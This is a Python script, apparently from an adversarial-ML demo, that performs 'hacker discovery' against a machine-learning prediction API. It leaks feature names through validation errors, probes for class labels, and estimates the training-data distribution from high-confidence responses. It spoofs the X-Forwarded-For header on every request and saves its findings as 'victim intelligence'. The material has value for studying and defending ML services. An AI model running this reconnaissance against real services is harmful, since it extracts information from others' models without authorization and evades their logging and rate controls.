"""
Hacker Discovery Phase — Black-Box Intelligence Gathering

Strategy:
1. Send an empty payload to extract feature names from validation errors (API schema leak).
2. Send random probes across a wide range to discover class labels.
3. Use CONFIDENCE-FILTERED PROBING to estimate the real data distribution:
   - High confidence from an ML model = the input looks "normal" to the model = in-distribution.
   - Send hundreds of random probes, keep the ones the model is most confident about.
   - Compute per-feature mean and std from these high-confidence samples.
   - This gives us a statistical fingerprint of the training data without ever seeing it.
"""
import httpx
import json
import os
import numpy as np

DISCOVERY_IP = "10.9.9.9"


def run_discovery(url, output_file="victim_info.json"):
    print(f"\n[+] Initiating Hacker Discovery Phase against {url}")

    info = {
        "feature_names": [],
        "feature_count": 0,
        "classes": [],
        "feature_stats": {},  # per-feature mean and std estimated from confident responses
    }

    with httpx.Client() as client:
        # ─── Step 1: Feature Name Extraction via Validation Error Leak ───
        print("[*] Sending empty payload to extract schema via validation errors...")
        try:
            response = client.post(url, json={}, headers={"X-Forwarded-For": DISCOVERY_IP})
            if response.status_code == 422:
                error_data = response.json()
                features = []
                for detail in error_data.get("detail", []):
                    loc = detail.get("loc", [])
                    if len(loc) >= 2 and loc[0] == "body":
                        features.append(loc[1])
                info["feature_names"] = features
                info["feature_count"] = len(features)
                print(f"[+] Extracted {info['feature_count']} features: {features[:5]}...")
            else:
                print(f"[-] Unexpected status code: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Discovery failed: {e}")
            return False

        if info["feature_count"] == 0:
            print("[-] No features discovered. Aborting.")
            return False

        n_features = info["feature_count"]
        feature_names = info["feature_names"]

        # ─── Step 2: Multi-Scale Probing ───
        # We probe at multiple scales and let the model's confidence tell us which is right.
        print("[*] Launching multi-scale probes to discover input range and classes...")

        scales = [0.01, 0.1, 1.0, 10.0, 100.0, 1000.0]
        all_probes = []      # list of (feature_vector, confidence, class_label)
        discovered_classes = set()

        total_probes = len(scales) * 10
        completed = 0

        for scale in scales:
            n_probes = 10  # Reduced from 80 for instant demo execution
            probe_matrix = np.random.randn(n_probes, n_features) * scale
            for i in range(n_probes):
                probe_payload = dict(zip(feature_names, probe_matrix[i].tolist()))
                try:
                    response = client.post(
                        url, json=probe_payload,
                        headers={"X-Forwarded-For": DISCOVERY_IP},
                        timeout=5.0
                    )
                    if response.status_code == 200:
                        data = response.json()
                        label = data.get("prediction", "")
                        conf = data.get("confidence", 0.0)
                        discovered_classes.add(label)
                        all_probes.append((probe_matrix[i], conf, label))
                except Exception:
                    pass
                
                completed += 1
                if completed % 10 == 0 or completed == total_probes:
                    percent = int((completed / total_probes) * 100)
                    bars = int((percent / 100) * 20)
                    progress = "#" * bars + "-" * (20 - bars)
                    print(f"  [{progress}] {percent}%")

        info["classes"] = sorted(list(discovered_classes))
        print(f"[+] Discovered {len(info['classes'])} classes: {info['classes']}")
        print(f"[+] Total valid probes collected: {len(all_probes)}")

        # ─── Step 3: Confidence-Filtered Distribution Estimation ───
        # Key insight: ML models are most confident on inputs that resemble their training data.
        # By selecting the top-confidence probes, we approximate the real data distribution.
        print("[*] Estimating feature distributions from high-confidence responses...")

        if len(all_probes) < 10:
            print("[-] Not enough probes to estimate distribution. Using fallback.")
            for fname in feature_names:
                info["feature_stats"][fname] = {"mean": 0.0, "std": 10.0}
        else:
            # Sort by confidence descending and take the top 50%
            all_probes.sort(key=lambda x: x[1], reverse=True)
            top_k = max(10, len(all_probes) // 2)
            top_probes = np.array([p[0] for p in all_probes[:top_k]])

            print(f"[+] Using top {top_k} highest-confidence probes (out of {len(all_probes)})")
            print(f"    Confidence range of selected probes: "
                  f"{all_probes[top_k-1][1]:.4f} — {all_probes[0][1]:.4f}")

            for i, fname in enumerate(feature_names):
                col = top_probes[:, i]
                feat_mean = float(np.mean(col))
                feat_std = float(np.std(col))
                # Guard against zero std (degenerate)
                if feat_std < 1.0:
                    feat_std = 1.0
                info["feature_stats"][fname] = {"mean": feat_mean, "std": feat_std}

            # Print a summary of discovered scales
            means = [info["feature_stats"][f]["mean"] for f in feature_names]
            stds = [info["feature_stats"][f]["std"] for f in feature_names]
            print(f"[+] Feature mean range:  [{min(means):.2f}, {max(means):.2f}]")
            print(f"[+] Feature std range:   [{min(stds):.2f}, {max(stds):.2f}]")

        # ─── Step 4: Refine with Targeted Probes ───
        # Now that we have a rough distribution, probe again using it to refine the estimate.
        print("[*] Refining distribution estimate with targeted in-distribution probes...")

        refined_probes = []
        means_vec = np.array([info["feature_stats"][f]["mean"] for f in feature_names])
        stds_vec = np.array([info["feature_stats"][f]["std"] for f in feature_names])

        n_refine = 30  # Reduced from 200 for instant demo execution
        refine_matrix = np.random.randn(n_refine, n_features) * stds_vec + means_vec
        
        completed_refine = 0
        for i in range(n_refine):
            probe_payload = dict(zip(feature_names, refine_matrix[i].tolist()))
            try:
                response = client.post(
                    url, json=probe_payload,
                    headers={"X-Forwarded-For": DISCOVERY_IP},
                    timeout=5.0
                )
                if response.status_code == 200:
                    data = response.json()
                    conf = data.get("confidence", 0.0)
                    refined_probes.append((refine_matrix[i], conf))
            except Exception:
                pass
            
            completed_refine += 1
            if completed_refine % 10 == 0 or completed_refine == n_refine:
                percent = int((completed_refine / n_refine) * 100)
                bars = int((percent / 100) * 20)
                progress = "#" * bars + "-" * (20 - bars)
                print(f"  [{progress}] {percent}%")

        if len(refined_probes) >= 20:
            # Again take top 25% by confidence
            refined_probes.sort(key=lambda x: x[1], reverse=True)
            top_k = max(20, len(refined_probes) // 4)
            top_refined = np.array([p[0] for p in refined_probes[:top_k]])

            for i, fname in enumerate(feature_names):
                col = top_refined[:, i]
                feat_mean = float(np.mean(col))
                feat_std = float(np.std(col))
                if feat_std < 1.0:
                    feat_std = 1.0
                info["feature_stats"][fname] = {"mean": feat_mean, "std": feat_std}

            means = [info["feature_stats"][f]["mean"] for f in feature_names]
            stds = [info["feature_stats"][f]["std"] for f in feature_names]
            print(f"[+] Refined feature mean range: [{min(means):.2f}, {max(means):.2f}]")
            print(f"[+] Refined feature std range:  [{min(stds):.2f}, {max(stds):.2f}]")

        # ─── Save Intelligence ───
        out_path = os.path.join(os.path.dirname(__file__), output_file)
        try:
            with open(out_path, "w") as f:
                json.dump(info, f, indent=4)
            print(f"[+] Discovery complete. Intelligence saved to {output_file}")
        except Exception as e:
            print(f"[+] Discovery complete. (Skipped saving to disk due to parallel execution)")
        return True


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/api/v1/predict"
    run_discovery(target)
